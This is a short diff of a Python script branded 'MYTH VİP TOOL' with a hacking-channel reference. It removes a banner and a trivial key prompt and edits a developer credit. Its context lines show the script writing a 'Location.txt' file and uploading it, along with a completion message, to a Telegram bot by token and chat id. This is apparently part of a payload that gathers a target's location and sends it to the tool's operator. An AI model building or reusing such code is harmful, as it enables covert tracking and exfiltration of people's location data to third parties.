@@ -14,29 +14,6 @@ E = '\033[1;97m'
 
 os.system('clear')
 
-Op = "A"
-print(Z1+'━'*60)
-azooz=f" {M}                         MYTH VİP TOOL  " 
-print(azooz)
-print(Z1+'━'*60)
-print("")
-def cls():
- os.system("clear")
-
-def pas():
-  J = input(f"{M} 𝐏𝐋𝐄𝐀𝐒𝐄 𝐄𝐍𝐓𝐄𝐑 𝐊𝐄𝐘 ➞  	")
-  if J ==Op:
-   print(F+"\n ✅ 𝐊𝐄𝐘 𝐂𝐎𝐍𝐅𝐈𝐑𝐌𝐄𝐃..   ")
-   time.sleep(2)
-   cls()
-  else:
-   print(Z+'\n ⛔ 𝐊𝐄𝐘 𝐅𝐀𝐈𝐋𝐄𝐃 \n ')
-   pas()
-pas()
-
-os.system('clear')
-
-
 print(Style.RESET_ALL)
 print(Style.BRIGHT)
 print(Fore.GREEN)
@@ -298,7 +275,7 @@ with open('Location.txt','w') as Jbs:
     res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
               
     
-tlg = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=✅Done : Devloper by MythDeath > @MythEmre ✅ ')''')
+tlg = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=✅Done : Devloper by MythDeath > @ M y t h E m r e ✅ ')''')
 
 #os.system(f'xdg-open https://t.me/MythHackChannel')
 
